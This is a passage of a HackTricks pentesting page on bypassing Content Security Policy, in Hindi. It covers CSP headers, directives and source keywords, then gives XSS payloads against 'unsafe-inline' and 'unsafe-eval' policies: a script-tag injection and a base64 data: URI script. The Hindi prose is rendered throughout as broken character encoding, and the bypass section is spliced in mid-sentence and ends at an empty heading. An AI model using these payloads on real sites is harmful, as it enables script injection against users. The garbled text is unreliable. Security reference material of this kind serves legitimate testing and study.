# рд╕рд╛рдордЧреНрд░реА рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ (CSP) рдмрд╛рдИрдкрд╛рд╕

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдореЗрдВ рд╕рднреА рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣реЛрдо рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рддрднреА рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдЗрдирд╛рдо рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдЗрдирд╛рдо рдЙрд╕ рдмрдЧ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдорд┐рд▓реЗрдЧрд╛ред

**Web3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЗрд╕рдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ web3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**Web3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпрд╛рдпрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

## CSP рдХреНрдпрд╛ рд╣реИ

рд╕рд╛рдордЧреНрд░реА рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ рдпрд╛ CSP рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА рддрдХрдиреАрдХ рд╣реИ рдЬреЛ **рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ (XSS) рдЬреИрд╕реЗ рд╣рдорд▓реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИ**ред рдпрд╣ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкрде рдФрд░ рд╕реНрд░реЛрддреЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рддрд╛ рд╣реИред рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдореЗрдВ рдЪрд┐рддреНрд░, рдлреНрд░реЗрдо, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдЕрдзрд┐рдХ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдЬрд╣рд╛рдВ рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди (рд╕реНрд╡рдпрдВ) рд╕реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдФрд░ рдЗрдирд▓рд╛рдЗрди рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдФрд░ `eval`, `setTimeout` рдпрд╛ `setInterval` рдЬреИрд╕реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ:

рд╕рд╛рдордЧреНрд░реА рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ рдХреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реИрдбрд░** рдпрд╛ **HTML рдкреЗрдЬ рдХреЗ рдореЗрдЯрд╛ рддрддреНрд╡реЛрдВ** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдкреНрд░рд╛рдкреНрдд рдиреАрддрд┐ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рд╕рдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ рд╣реА рд╡реЗ рдкрддрд╛ рдЪрд▓рддреА рд╣реИрдВред

рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реИрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
рдПрдХ рдореЗрдЯрд╛ рдЯреИрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### рд╣реЗрдбрд░реНрд╕

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` рдпрд╣ рдХреБрдЫ рдирд╣реАрдВ рд░реЛрдХреЗрдЧрд╛, рдХреЗрд╡рд▓ рд░рд┐рдкреЛрд░реНрдЯ рднреЗрдЬреЗрдЧрд╛ (рдкреНрд░реА рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ)ред

## рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдирд╛

CSP рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реЗ рдкреНрд░рд╛рдердорд┐рдХ рдФрд░ рдЧреИрд░-рдкреНрд░рд╛рдердорд┐рдХ рд╕рд╛рдордЧреНрд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореВрд▓ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдХреЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕рдХреНрд░рд┐рдп рд╕рд╛рдордЧреНрд░реА рдХреЗ рдирд┐рд╢реНрдЪрд┐рдд рдкрд╣рд▓реБрдУрдВ рдХреЛ рднреА рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЗрдирд▓рд╛рдЗрди рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдФрд░ `eval()` рдХрд╛ рдЙрдкрдпреЛрдЧред
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### рдирд┐рд░реНрджреЗрд╢

* **script-src**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдХреЗрд╡рд▓ рддрддреНрд╡реЛрдВ рдореЗрдВ рд╕реАрдзреЗ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ URL рд╣реА рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ, рд╕рд╛рде рд╣реА рд╕рд╛рде рдЗрдирд▓рд╛рдЗрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрд╡реЗрдВрдЯ рд╣реИрдВрдбрд▓рд░ (onclick) рдФрд░ XSLT рд╕реНрдЯрд╛рдЗрд▓рд╢реАрдЯ рднреА рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* **default-src**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдиреАрддрд┐ рдХрд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬрдм рдПрд╕рдкреАрдПрд╕ рд╣реИрдбрд░ рдореЗрдВ рдлрд╝реЗрдЪ рдирд┐рд░реНрджреЗрд╢ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрд╕ рдирд┐рд░реНрджреЗрд╢ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИред
* **Child-src**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рд╡реЗрдм рд╡рд░реНрдХрд░реНрд╕ рдФрд░ рдПрдореНрдмреЗрдбреЗрдб рдлрд╝реНрд░реЗрдо рд╕рд╛рдордЧреНрд░реА рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* **connect-src**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ fetch, websocket, XMLHttpRequest рдЬреИрд╕реЗ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ URL рд▓реЛрдб рдХрд░рдиреЗ рдХреА рд╕реАрдорд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред
* **frame-src**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдмреБрд▓рд╛рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдлрд╝реНрд░реЗрдо рдХреЗ рд▓рд┐рдП URL рдХреА рд╕реАрдорд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред
* **frame-ancestors**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рд╡рд░реНрддрдорд╛рди рдкреГрд╖реНрда рдХреЛ рдПрдореНрдмреЗрдб рдХрд░ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдирд┐рд░реНрджреЗрд╢ [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame), [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe), [`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object), [`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed), рдпрд╛ [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet) рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдирд╣реАрдВ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдЯреИрдЧ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХреЗрд╡рд▓ рдЧреИрд░-рдПрдЪрдЯреАрдПрдордПрд▓ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реА рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред
* **img-src**: рдЗрд╕рдореЗрдВ рд╡реЗрдм рдкреГрд╖реНрда рдкрд░ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **font-src:** рдирд┐рд░реНрджреЗрд╢ рдлрд╝реЙрдиреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП `@font-face` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдорд╛рдиреНрдп рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред
* **manifest-src**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдЖрд╡реЗрджрди рдорд╛рдирд┐рдлрд╝реЗрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдЕрдиреБрдорддрд┐рдд рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
* **media-src**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдореАрдбрд┐рдпрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
* **object-src**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ \<object>, \<embed>, рдФрд░ \<applet> рддрддреНрд╡реЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
* **base-uri**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдЙрди URL рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рддрддреНрд╡ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **form-action**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдЯреИрдЧ рд╕реЗ рд╕рдмрдорд┐рд╢рди рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рдЕрдВрдд-рдмрд┐рдВрджреБрдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рддрд╛ рд╣реИред
* **plugin-types**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдорд╛рдЗрдо рдкреНрд░рдХрд╛рд░реЛрдВ рдкрд░ рд╕реАрдорд╛рдПрдБ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
* **upgrade-insecure-requests**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ URL рдпреЛрдЬрдирд╛рдУрдВ рдХреЛ рдкреБрдирд░реНрд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, HTTP рдХреЛ HTTPS рдореЗрдВ рдмрджрд▓рддрд╛ рд╣реИред рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдкреБрд░рд╛рдиреЗ URL рдХреЗ рдмрдбрд╝реЗ рд╕рдВрдЦреНрдпрд╛ рд╡рд╛рд▓реА рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдкреБрдирд░реНрд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
* **sandbox**: рдЗрд╕ рдирд┐рд░реНрджреЗрд╢ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрд░реЛрдзрд┐рдд рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдкреГрд╖реНрда рдХреА рдХреНрд░рд┐рдпрд╛рдПрдБ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд▓рдЧрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдкреЙрдкрдЕрдкреНрд╕ рдХреЛ рд░реЛрдХрдирд╛, рдкреНрд▓рдЧрдЗрди рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд░реЛрдХрдирд╛, рдФрд░ рд╕рдорд╛рди рдореВрд▓ рдиреАрддрд┐ рдХреЛ рдкреНрд░рдпреЛрдЧ рдХрд░рдирд╛ред

### **рд╕реНрд░реЛрдд**

* \*: рдЗрд╕рд╕реЗ `data:` , `blob:` , `filesystem:` рдпреЛрдЬрдирд╛рдПрдБ рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдХрд┐рд╕реА рднреА URL рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ
* **self**: рдпрд╣ рд╕реНрд░реЛрдд рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдкреГрд╖реНрда рдкрд░ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдПрдХ рд╣реА рдбреЛрдореЗрди рд╕реЗ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред
* **data**: рдпрд╣ рд╕реНрд░реЛрдд рдбреЗрдЯрд╛ рдпреЛрдЬрдирд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЙрджрд╛ред рдмреЗрд╕64 рдХреЛрдб рдХрд┐рдП рдЧрдП рдЫрд╡рд┐рдпрд╛рдБ)
* **none**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдХрд┐рд╕реА рднреА рд╕реНрд░реЛрдд рд╕реЗ рдХреБрдЫ рднреА рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИред
* **unsafe-eval**: рдЗрд╕рд╕реЗ eval() рдФрд░ рдЗрд╕рдХреЗ рд╕рдорд╛рди рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕реЗ рдХреЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдХрд┐рд╕реА рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИред рдЗрд╕реА рдХрд╛рд░рдг рд╕реЗ, рдЗрд╕реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
* **unsafe-hashes**: рдЗрд╕рд╕реЗ рд╡рд┐рд╢реЗрд╖ рдЗрдирд▓рд╛рдЗрди рдЗрд╡реЗрдВрдЯ рд╣реИрдВрдбрд▓рд░ рдХреЛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **unsafe-inline**: рдЗрд╕рд╕реЗ рдЗрдирд▓рд╛рдЗрди рд╕рдВрд╕рд╛рдзрдиреЛрдВ, рдЬреИрд╕реЗ рдЗрдирд▓рд╛рдЗрди рддрддреНрд╡, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ: URL, рдЗрдирд▓рд╛рдЗрди рдЗрд╡реЗрдВрдЯ рд╣реИрдВрдбрд▓рд░ рдФрд░ рдЗрдирд▓рд╛рдЗрди рддрддреНрд╡реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдлрд┐рд░ рднреА рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд╢рдВрд╕рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **nonce**: рдПрдХ рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХ рдиреЙрдиреНрд╕ (рдПрдХ рдмрд╛рд░ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд╕рдВрдЦреНрдпрд╛) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖ рдЗрдирд▓рд╛рдЗрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯред рд╕рд░реНрд╡рд░ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдмрд╛рд░ рдЬрдм рд╡рд╣ рдиреАрддрд┐ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдиреЙрдиреНрд╕ рдорд╛рди рдЙрддреНрдкрдиреНрди
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд▓реЛрдб: `"/><script>alert(1);</script>`

#### Iframes рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ self + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
рдХрд╛рд░реНрдпрд░рдд рдкреЗрд▓реЛрдб:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

